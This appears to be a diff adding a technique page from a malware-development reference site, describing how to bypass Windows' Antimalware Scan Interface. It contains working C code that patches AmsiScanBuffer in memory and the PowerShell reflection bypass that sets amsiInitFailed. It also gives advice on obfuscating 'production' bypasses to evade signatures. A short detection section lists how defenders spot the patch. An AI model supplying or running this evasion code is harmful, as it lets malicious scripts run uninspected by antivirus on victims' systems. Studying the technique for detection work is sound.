@@ -1,0 +1,173 @@
+---
+title: AMSI Bypass
+mitre: T1562.001
+category: evasion
+group: Sensor Blinding
+summary: Patch or neutralise the Antimalware Scan Interface so PowerShell and .NET payloads run uninspected.
+platform: [Windows]
+tags: ['PowerShell', 'C / C++', '.NET', 'AMSI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: locate AmsiScanBuffer in amsi.dll
+    desc: GetProcAddress resolves the export; the in-process copy is what we patch.
+    dll: amsi
+  - call: VirtualProtect(PAGE_EXECUTE_READWRITE)
+    desc: Make the function's first bytes writable.
+    dll: kernel32
+  - call: write patch bytes
+    desc: Overwrite the prologue with a RET or a forced AMSI_RESULT_CLEAN return.
+    dll: —
+  - call: VirtualProtect(original protection)
+    desc: Restore page permissions to avoid leaving RWX pages as an indicator.
+    dll: kernel32
+detections:
+  - src: ETW-TI
+    text: VirtualProtect on amsi.dll's .text section from a non-AMSI process.
+  - src: MEMORY SCAN
+    text: AmsiScanBuffer first bytes differ from the on-disk copy of amsi.dll.
+  - src: BEHAVIOURAL
+    text: PowerShell process that never triggers an AMSI scan event despite executing script blocks.
+  - src: YARA
+    text: Known patch byte sequences (xor eax,eax / ret, or mov eax,80070057h / ret) at AmsiScanBuffer offset.
+related:
+  - mitre: T1562.006
+    title: ETW Telemetry Blinding
+    desc: Companion technique — blind ETW after bypassing AMSI to remove the second logging layer.
+    href: /techniques/detection/etw-telemetry
+  - mitre: T1059.001
+    title: PowerShell
+    desc: The primary consumer of AMSI; bypass enables arbitrary PS script execution.
+  - mitre: T1106
+    title: Direct Syscalls
+    desc: Use direct syscalls for VirtualProtect to avoid hooking of the VirtualProtect stub.
+    href: /techniques/evasion/direct-syscalls
+labKit:
+  - label: amsi_patch.c + amsi_patch.ps1
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The Antimalware Scan Interface (AMSI) intercepts script content — PowerShell, VBScript, JScript,
+.NET assemblies — and passes it to the registered AV provider before execution. Because AMSI
+runs in-process (inside `powershell.exe`, `wscript.exe`, the CLR host), an attacker who controls
+code execution can modify its implementation before using it.
+
+The canonical bypass patches the `AmsiScanBuffer` function in the already-loaded `amsi.dll` so
+it immediately returns `AMSI_RESULT_CLEAN` (1) without calling the provider. Every subsequent
+scan in that process is silently approved.
+
+<Callout type="caution">
+  AMSI bypass only silences the in-process scanner. ETW script-block logging, PowerShell
+  transcription, and Constrained Language Mode are independent controls. Bypassing AMSI while
+  these remain active still leaves a full transcript of every command.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### C / native
+
+<CodeBlock
+  file="amsi_patch.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
+// Works in any process that loads amsi.dll (powershell, wscript, cscript, .NET host)
+void patch_amsi(void) {
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    if (!amsi) return;
+
+    FARPROC fn = GetProcAddress(amsi, "AmsiScanBuffer");
+    if (!fn) return;
+
+    // Patch: xor eax, eax (31 C0) ; ret (C3)
+    // Result: function returns 0 immediately, which is AMSI_RESULT_CLEAN
+    const BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+
+    DWORD old_prot;
+    VirtualProtect(fn, sizeof patch, PAGE_EXECUTE_READWRITE, &old_prot);
+    memcpy(fn, patch, sizeof patch);
+    VirtualProtect(fn, sizeof patch, old_prot, &old_prot);
+    FlushInstructionCache(GetCurrentProcess(), fn, sizeof patch);
+}`}
+/>
+
+### PowerShell (reflection)
+
+<CodeBlock
+  file="amsi_patch.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Classic reflection-based patch — well-known, detected by name
+# Shown for educational context; production variants obfuscate field names
+
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+
+# Alternative: patch AmsiScanBuffer via P/Invoke from PowerShell
+$sig = @"
+[DllImport("kernel32")] public static extern bool VirtualProtect(
+    IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
+"@
+$t = Add-Type -MemberDefinition $sig -Name Win32 -Namespace _ -PassThru
+
+$amsi   = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+              (Get-ProcAddress amsi.dll AmsiScanBuffer),
+              (New-Object System.Func[IntPtr]))
+# ... write patch bytes via Marshal ...`}
+/>
+
+## Bypass taxonomy
+
+| Technique | Scope | Stealthiness |
+|---|---|---|
+| Patch `AmsiScanBuffer` prologue | In-process | Medium — byte pattern is signatured |
+| Set `amsiInitFailed = true` (PS) | PS process | Low — field name is signatured |
+| Patch `AmsiOpenSession` | In-process | Medium |
+| Unload `amsi.dll` | In-process | Low — module unload is logged |
+| COM server hijack | System-wide | High — no memory patch |
+| Patching in a new runspace | New PS runspace | Medium |
+
+The `amsiInitFailed` field approach is the most commonly cited and the most heavily
+signatured. Any production bypass should use a method that avoids known field names and
+known patch byte sequences.
+
+## Obfuscation to avoid static detection
+
+The patch byte sequence `31 C0 C3` or `B8 57 00 07 80 C3` (return E_INVALIDARG) is a static
+signature. Defeating it requires either:
+
+- **Runtime byte construction** — build the patch array from XOR or ADD operations at runtime
+- **Indirect write** — copy bytes through a buffer, write through a function pointer
+- **Alternative patches** — patch `AmsiInitialize` instead; patch the CLSID lookup that loads the provider
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable ongoing detection is comparing the in-memory bytes of `AmsiScanBuffer` to
+the on-disk copy of `amsi.dll` at the corresponding offset. Any difference is a patch. This
+comparison is cheap and can run as a periodic thread in a security agent or EDR.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
